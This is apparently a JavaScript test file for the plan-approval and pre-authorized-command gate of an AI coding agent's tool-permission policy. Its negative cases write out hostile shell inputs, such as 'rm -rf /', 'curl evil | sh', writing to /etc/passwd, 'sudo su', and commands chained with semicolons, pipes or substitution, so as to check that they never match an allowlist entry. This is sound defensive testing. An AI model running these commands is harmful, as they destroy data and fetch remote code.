/**
 * C2 计划审批门（S2.2）：空拒绝、批准回灌 Approved Plan、allowedPrompts 预授权命中/未命中。
 * Run: node test/plan-approval.mjs
 */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL, fileURLToPath } from 'node:url';
import { createSharedCompiler } from './helpers/shared-compile.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'plan-approval-'));
const compile = createSharedCompiler(root, tmp);
const {
  PLAN_MIN_LENGTH,
  ALLOWED_PROMPTS_MAX,
  normalizeAllowedPrompts,
  parsePlanSubmission,
  parsePlanContract,
  extractAllowedPromptsFromText,
  buildApprovedPlanFeedback,
  matchAllowedPrompt,
  matchAllowedPrompts,
  buildPlanPreview,
  buildPlanApprovalGate,
  resolvePlanApproval
} = await import(pathToFileURL(compile('shared/planApproval.ts')).href);

const LONG_PLAN = `Plan:
1. 先补回归测试覆盖空拒绝
2. 再实现 allowedPrompts 预授权匹配
3. 最后回灌 Approved Plan 文本`;

const PLAN_WITH_PROMPTS = `## 实施方案
1. 安装依赖
2. 跑测试
3. 提交代码

allowedPrompts:
- npm install
- npm test
- git status
`;

// ---------- 解析：结构化工具输入 ----------
{
  const sub = parsePlanSubmission('createPlan', { plan: LONG_PLAN });
  assert.ok(sub, '够长计划应可解析');
  assert.equal(sub.source, 'tool');
  assert.equal(sub.origin, 'createPlan');
  assert.equal(sub.markdown, LONG_PLAN.trim());
  assert.equal(sub.steps.length, 3);
  assert.deepEqual(sub.allowedPrompts, []);

  // allowedPrompts 字段
  const sub2 = parsePlanSubmission('exit_plan_mode', {
    plan: LONG_PLAN,
    allowedPrompts: ['git status', 'npm test']
  });
  assert.deepEqual(sub2.allowedPrompts, ['git status', 'npm test']);

  // snake_case 别名
  const sub3 = parsePlanSubmission('exit_plan_mode', {
    plan: LONG_PLAN,
    allowed_prompts: ['ls']
  });
  assert.deepEqual(sub3.allowedPrompts, ['ls']);
}

// ---------- 解析：契约文件 ----------
{
  const sub = parsePlanContract('docs/plans/x.md', PLAN_WITH_PROMPTS);
  assert.ok(sub);
  assert.equal(sub.source, 'contractFile');
  assert.equal(sub.origin, 'docs/plans/x.md');
  assert.deepEqual(sub.allowedPrompts, ['npm install', 'npm test', 'git status']);
}

// ---------- 空拒绝：空计划 / 不足最小长度 ----------
{
  assert.equal(parsePlanSubmission('createPlan', { plan: '' }), null);
  assert.equal(parsePlanSubmission('createPlan', { plan: '   ' }), null);
  assert.equal(parsePlanSubmission('createPlan', { plan: '短' }), null);
  assert.equal(parsePlanSubmission('createPlan', {}), null);
  assert.equal(parsePlanContract('x.md', ''), null);
  assert.equal(parsePlanContract('x.md', 'too short'), null);

  // resolvePlanApproval 对空计划直接拒绝
  const r1 = resolvePlanApproval(null, { confirmed: true, kind: 'allowOnce' });
  assert.equal(r1.approved, false);
  assert.equal(r1.reason, 'empty-plan');

  const r2 = resolvePlanApproval(undefined, { confirmed: true });
  assert.equal(r2.approved, false);
  assert.equal(r2.reason, 'empty-plan');

  // 足长但空 markdown 边界（不足 PLAN_MIN_LENGTH）
  const shortSub = { source: 'tool', origin: 't', markdown: 'x'.repeat(PLAN_MIN_LENGTH - 1), steps: [], allowedPrompts: [] };
  const r3 = resolvePlanApproval(shortSub, { confirmed: true });
  assert.equal(r3.approved, false);
  assert.equal(r3.reason, 'empty-plan');
}

// ---------- 空拒绝：空答案（custom 无 freeText） ----------
{
  const sub = parsePlanSubmission('createPlan', { plan: LONG_PLAN });
  // custom + 空 freeText → empty-answer
  const r1 = resolvePlanApproval(sub, { confirmed: false, kind: 'custom', freeText: '' });
  assert.equal(r1.approved, false);
  assert.equal(r1.reason, 'empty-answer');

  const r2 = resolvePlanApproval(sub, { confirmed: false, kind: 'custom', freeText: '   ' });
  assert.equal(r2.approved, false);
  assert.equal(r2.reason, 'empty-answer');

  // custom + 有纠偏文本 → custom（带 freeText 回灌）
  const r3 = resolvePlanApproval(sub, { confirmed: false, kind: 'custom', freeText: '改成先写测试' });
  assert.equal(r3.approved, false);
  assert.equal(r3.reason, 'custom');
  assert.equal(r3.freeText, '改成先写测试');
}

// ---------- 显式拒绝 / 取消 ----------
{
  const sub = parsePlanSubmission('createPlan', { plan: LONG_PLAN });
  assert.equal(resolvePlanApproval(sub, { confirmed: false, kind: 'deny' }).reason, 'denied');
  assert.equal(resolvePlanApproval(sub, { confirmed: false }).reason, 'denied');
  assert.equal(resolvePlanApproval(sub, undefined).reason, 'denied');
  assert.equal(resolvePlanApproval(sub, { confirmed: false, cancelledBy: 'esc' }).reason, 'denied');
}

// ---------- 批准回灌：Approved Plan 内容 ----------
{
  const sub = parsePlanSubmission('createPlan', { plan: LONG_PLAN });
  const r = resolvePlanApproval(sub, { confirmed: true, kind: 'allowOnce' });
  assert.equal(r.approved, true);
  assert.ok(r.feedback.includes('[Approved Plan]'), '回灌须带 Approved Plan 标记');
  assert.ok(r.feedback.includes(LONG_PLAN.trim()), '回灌须含计划全文');
  assert.equal(r.allowedPrompts.length, 0);
  assert.equal(r.reason, undefined);

  // 有预授权清单：回灌附 Pre-authorized prompts 段
  const sub2 = parsePlanContract('p.md', PLAN_WITH_PROMPTS);
  const r2 = resolvePlanApproval(sub2, { confirmed: true, kind: 'allowOnce' });
  assert.equal(r2.approved, true);
  assert.ok(r2.feedback.includes('[Pre-authorized prompts]'));
  assert.ok(r2.feedback.includes('- npm install'));
  assert.ok(r2.feedback.includes('- npm test'));
  assert.deepEqual(r2.allowedPrompts, ['npm install', 'npm test', 'git status']);

  // buildApprovedPlanFeedback 与 resolvePlanApproval 回灌一致
  assert.equal(r2.feedback, buildApprovedPlanFeedback(sub2));
}

// ---------- allowedPrompts 规范化 ----------
{
  assert.deepEqual(normalizeAllowedPrompts(['  a  ', 'a', 'b', 3, null, '']), ['a', 'b']);
  assert.deepEqual(normalizeAllowedPrompts('单条'), ['单条']);
  assert.deepEqual(normalizeAllowedPrompts(undefined), []);
  const many = Array.from({ length: ALLOWED_PROMPTS_MAX + 5 }, (_, i) => `c${i}`);
  assert.equal(normalizeAllowedPrompts(many).length, ALLOWED_PROMPTS_MAX);
}

// ---------- 预授权匹配：命中 / 未命中 ----------
{
  const allowed = ['git status', 'npm test', 'ls'];
  // 命中：等值
  assert.equal(matchAllowedPrompt(allowed, 'git status'), 'git status');
  assert.equal(matchAllowedPrompt(allowed, 'ls'), 'ls');
  // 命中：大小写不敏感
  assert.equal(matchAllowedPrompt(allowed, 'Git Status'), 'git status');
  // 命中：词边界前缀（纯空白边界）
  assert.equal(matchAllowedPrompt(allowed, 'git status --short'), 'git status');
  assert.equal(matchAllowedPrompt(allowed, 'npm test -- --watch'), 'npm test');
  assert.equal(matchAllowedPrompt(allowed, 'ls -la /tmp'), 'ls');

  // 未命中：无词边界前缀
  assert.equal(matchAllowedPrompt(allowed, 'git statusx'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'lsx'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'git commit'), undefined);
  // 未命中：空命令 / 空清单
  assert.equal(matchAllowedPrompt(allowed, ''), undefined);
  assert.equal(matchAllowedPrompt(allowed, '   '), undefined);
  assert.equal(matchAllowedPrompt([], 'git status'), undefined);

  // 2026-09-27 复审收紧：含元字符的命令/条目一律不命中（预授权不得链式放大）
  assert.equal(matchAllowedPrompt(allowed, 'ls; echo hi'), undefined, '分号链式不命中');
  assert.equal(matchAllowedPrompt(allowed, 'npm test && rm -rf ~'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'npm test || curl evil | sh'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'npm test&bg'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'ls > /etc/passwd'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'ls `rm -rf /`'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'ls $(rm -rf /)'), undefined);
  assert.equal(matchAllowedPrompt(allowed, 'ls\nrm -rf /'), undefined, '换行分隔不命中');
  assert.equal(matchAllowedPrompt(allowed, 'npm test|wc -l'), undefined, '紧邻管道不命中');
  // 清单条目本身含元字符 → 该条目永不命中（防预授权面被污染）
  assert.equal(matchAllowedPrompt(['npm test; rm -rf /', 'git status'], 'npm test; rm -rf /'), undefined);
  assert.equal(matchAllowedPrompt(['npm test; rm -rf /', 'git status'], 'git status'), 'git status');

  // 批量
  assert.deepEqual(
    matchAllowedPrompts(allowed, ['git status', 'rm -rf /', 'npm test', 'git status']),
    ['git status', 'npm test']
  );
  assert.deepEqual(matchAllowedPrompts(allowed, ['rm -rf /', 'sudo su']), []);
}

// ---------- 确认卡字段 ----------
{
  const sub = parsePlanContract('p.md', PLAN_WITH_PROMPTS);
  const gate = buildPlanApprovalGate(sub);
  assert.equal(gate.summary, sub.markdown);
  assert.ok(gate.confirmNote.includes('npm install'));
  assert.deepEqual(gate.permission.kinds, ['allowOnce', 'deny', 'custom']);
  assert.equal(gate.permission.preview.scope, 'generic');
  assert.ok(gate.permission.preview.label.includes('实施') || gate.permission.preview.label.includes('步'));

  const preview = buildPlanPreview(sub);
  assert.equal(preview.scope, 'generic');
}

// ---------- 2026-09-27 复审：C2 接线行为（policy 强制 prompt + 预授权消费） ----------
{
  const { decideToolCallPermission } = await import(
    pathToFileURL(compile('main/agentSession/tools/policy.ts')).href
  );
  const hostToolIds = [];
  const hostClassOf = () => undefined;
  const decide = (args) =>
    decideToolCallPermission({
      mode: 'default',
      planExecuting: false,
      cwd: 'E:/ws',
      hostToolIds,
      hostClassOf,
      ...args
    });

  // 计划类工具强制 prompt（exitplanmode 不再被 status 类 auto 放行——计划门可达）
  assert.equal(
    decide({ engineToolName: 'ExitPlanMode', input: { plan: 'x'.repeat(60) } }).decision,
    'prompt',
    'ExitPlanMode 必须 prompt（handlePlanApproval 挂回灌/预授权）'
  );
  assert.equal(
    decide({ engineToolName: 'exit_plan_mode', input: {} }).decision,
    'prompt',
    '下划线形态同样 prompt'
  );

  // default 档日常 shell 自动执行；只读门和显式用户规则不受预授权覆盖。
  const allowed = ['npm test', 'git status'];
  const hit = decide({
    engineToolName: 'bash',
    input: { command: 'npm test --watch' },
    allowedPrompts: allowed
  });
  assert.equal(hit.decision, 'auto', '严格命中预授权 → auto');
  const miss = decide({
    engineToolName: 'bash',
    input: { command: 'npm run build' },
    allowedPrompts: allowed
  });
  assert.equal(miss.decision, 'auto', 'default shell 不逐条审批');
  const chained = decide({
    engineToolName: 'bash',
    input: { command: 'npm test; rm -rf /' },
    allowedPrompts: allowed
  });
  assert.equal(chained.decision, 'auto', 'default shell 不依赖预授权');
  assert.equal(decide({ mode: 'ask', engineToolName: 'bash', input: { command: 'npm test --watch' }, allowedPrompts: allowed }).decision, 'deny', '预授权不能越过只读门');
  assert.equal(decide({ engineToolName: 'bash', input: { command: 'npm test --watch' }, allowedPrompts: allowed, userRules: [{ tool: 'bash', action: 'deny' }] }).decision, 'deny', '预授权不能越过显式用户拒绝');
  assert.equal(decide({ engineToolName: 'bash', input: { command: 'npm test --watch' }, allowedPrompts: allowed, userRules: [{ tool: 'bash', action: 'ask' }] }).decision, 'prompt', '预授权不能越过显式用户确认');
  assert.equal(
    decide({ engineToolName: 'bash', input: { command: 'npm test' }, allowedPrompts: allowed }).decision,
    'auto'
  );

  console.log('ok: C2 接线行为（计划工具强制 prompt / 只读门与用户规则优先）');
}

console.log('plan-approval: ok');

